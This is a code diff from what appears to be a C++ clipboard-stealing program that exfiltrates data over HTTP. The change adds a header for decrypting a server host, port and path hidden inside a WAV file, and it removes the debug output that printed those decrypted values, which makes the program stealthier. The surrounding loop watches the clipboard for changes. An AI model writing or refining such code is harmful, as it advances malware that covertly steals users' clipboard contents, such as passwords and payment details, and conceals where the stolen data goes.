@@ -6,6 +6,7 @@
 #include <clipboard.h>
 #include <tools.h>
 #include <httpexfil.h>
+#include <wavcrypt.h>
 
 // Console ouput UTF_16 format, TODO REMOVE
 #include <fcntl.h>
@@ -35,10 +36,6 @@ int main() {
     std::string lastClipboard = "";
 
     auto [host, port, path] = ExtractAndDecryptConfig("ouch.wav");
-
-    std::cout << "DECRYPTED_HOST: " + host << " (" << host.length() << ")\n";
-    std::cout << "\nDECRYPTED_PORT: " + port << " (" << port.length() << ")\n";
-    std::cout << "\nDECRYPTED_PATH: " + path << " (" << path.length() << ")\n";
 
     while(true)
     {
